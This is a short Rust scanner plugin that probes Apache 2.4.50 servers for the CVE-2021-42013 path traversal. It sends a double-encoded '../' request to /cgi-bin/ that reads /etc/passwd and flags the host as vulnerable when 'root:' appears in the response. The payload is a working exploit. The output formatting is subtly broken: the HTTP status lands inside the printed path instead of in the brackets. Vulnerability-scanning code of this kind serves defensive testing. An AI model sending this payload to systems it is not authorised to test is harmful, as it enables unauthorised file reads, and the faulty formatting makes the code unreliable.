/* http-vuln-cve2021-42013-4 - Apache 2.4.50 path traversal probe. */
#![allow(dead_code)]
mod arsenal;
use arsenal::*;

#[no_mangle]
pub extern "C" fn almap_script_run(ctx: *mut AlScriptContext) -> i32 {
let port = unsafe { (*ctx).port };
let mut resp = String::new();
resp = match http_request(ctx, "GET", "/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd", None, "", "", None, 8192) {
    Some(r) if !r.is_empty() => r,
    _ => { set_out(ctx, "http-vuln-cve2021-42013-4: no HTTP response"); return 0; }
};
if contains_ci(&resp, "root:") {
    set_out(ctx, &format!("VULNERABLE: /cgi-bin/%32{}{}65/%32{}{}65/%32{}{}65/%32{}{}65/etc/passwd [{}] (CVE-2021-42013)", http_status(&resp), 0, 0, 0, 0, 0, 0, 0, 0));
} else {
    set_out(ctx, &format!("not vulnerable: CVE-2021-42013 (/cgi-bin/%32{}{}65/%32{}{}65/%32{}{}65/%32{}{}65/etc/passwd [{}])", http_status(&resp), 0, 0, 0, 0, 0, 0, 0, 0));
}
0
}
